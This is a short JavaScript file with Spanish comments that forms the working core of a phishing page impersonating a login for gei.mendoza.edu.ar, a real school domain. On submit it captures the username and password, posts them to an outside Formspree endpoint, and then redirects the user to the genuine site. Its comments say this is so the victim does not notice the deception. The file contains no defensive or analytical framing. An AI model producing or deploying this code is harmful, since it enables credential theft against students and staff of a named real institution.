document.getElementById('loginForm').addEventListener('submit', function(event) {
    // 1. Prevenir que el formulario se envíe normalmente
    event.preventDefault();

    // 2. Capturar los datos del formulario
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // 3. Enviar los datos a tu receptor (Ejemplo: Formspree)
    //    IMPORTANTE: Reemplaza 'TU_URL_AQUI' con tu URL real de Formspree o similar.
    const receptorURL = 'https://formspree.io/f/mnjbkdlv';

    const datos = `Usuario: ${username}\nContraseña: ${password}`;

    fetch(receptorURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message: datos })
    })
    .then(response => {
        // 4. Redirigir a la página real para no levantar sospechas
        //    Esto es crucial para que la víctima no se dé cuenta del engaño.
        window.location.href = 'https://gei.mendoza.edu.ar/';
    })
    .catch(error => {
        console.error('Error al enviar datos:', error);
        // En caso de error, igual lo redirigimos para que no sospeche.
        window.location.href = 'https://gei.mendoza.edu.ar/';
    });
});
